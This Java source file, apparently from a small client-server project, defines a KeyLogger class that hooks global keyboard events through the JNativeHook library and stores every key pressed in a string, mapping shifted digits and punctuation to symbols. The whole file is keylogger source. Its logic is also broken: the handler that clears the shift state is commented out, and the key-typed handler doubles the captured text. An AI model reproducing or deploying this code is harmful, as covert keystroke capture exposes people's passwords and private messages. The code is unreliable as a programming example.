/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template
 */

package com.mycompany.server;

import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

/**
 *
 * @author FPT SHOP
 */
public class KeyLogger implements NativeKeyListener {
    public String s = "";
    boolean st;

    @Override
    public void nativeKeyPressed(NativeKeyEvent evt) {
         System.out.println("Key Pressed: " +
         NativeKeyEvent.getKeyText(evt.getKeyCode()));

        if (evt.getKeyCode() == NativeKeyEvent.VC_SHIFT) {
            st = true;
        }
        
        if (st == false) {
            s = s + NativeKeyEvent.getKeyText(evt.getKeyCode());
        }

        if (evt.getKeyCode() == NativeKeyEvent.VC_1 && st) {

            s = s + "!";

        }
        if (evt.getKeyCode() == NativeKeyEvent.VC_2 && st) {

            s = s + "@";

        }
        if (evt.getKeyCode() == NativeKeyEvent.VC_3 && st) {

            s = s + "#";

        }
        if (evt.getKeyCode() == NativeKeyEvent.VC_4 && st) {

            s = s + "$";

        }
        if (evt.getKeyCode() == NativeKeyEvent.VC_5 && st) {

            s = s + "%";

        }
        if (evt.getKeyCode() == NativeKeyEvent.VC_6 && st) {

            s = s + "^";

        }
        if (evt.getKeyCode() == NativeKeyEvent.VC_7 && st) {

            s = s + "&";

        }
        if (evt.getKeyCode() == NativeKeyEvent.VC_8 && st) {

            s = s + "*";

        }
        if (evt.getKeyCode() == NativeKeyEvent.VC_9 && st) {

            s = s + "(";

        }
        if (evt.getKeyCode() == NativeKeyEvent.VC_0 && st) {

            s = s + ")";

        }
        if (evt.getKeyCode() == NativeKeyEvent.VC_SPACE && st) {

            s = s + " ";
        }

        if (evt.getKeyCode() == NativeKeyEvent.VC_EQUALS&& st) {

            s = s + "+";
        }
        if(evt.getKeyCode()==NativeKeyEvent.VC_OPEN_BRACKET&&st)
        {
            s=s+"{";
        }
        if(evt.getKeyCode()==NativeKeyEvent.VC_CLOSE_BRACKET&&st)
        {
            s=s+"}";
        }
        if(evt.getKeyCode()==NativeKeyEvent.VC_COMMA&&st)
        {
            s=s+"<";
        }
        if(evt.getKeyCode()==NativeKeyEvent.VC_PERIOD&&st)
        {
            s=s+">";
        }
        if(evt.getKeyCode()==NativeKeyEvent.VC_SLASH&&st)
        {
            s=s+"?";
        }
        if(evt.getKeyCode()==NativeKeyEvent.VC_QUOTE&&st)
        {
            s=s+'"';
        }
        if(evt.getKeyCode()==NativeKeyEvent.VC_MINUS&&st)
        {
            s=s+"_";
        }
        if(evt.getKeyCode()==NativeKeyEvent.VC_BACKQUOTE&&st)
        {
            s=s+"~";
        }
    }


//    public void nativeKeyReleased(NativeKeyEvent evt) {
//         System.out.println("Key Released: " +
//         NativeKeyEvent.getKeyText(evt.getKeyCode()));
//        if (evt.getKeyCode() == NativeKeyEvent.VC_SHIFT) {
//            st = false;
//        }
//    }


    public void nativeKeyTyped(NativeKeyEvent evt) {         
        s+=s.toLowerCase();
    }
}
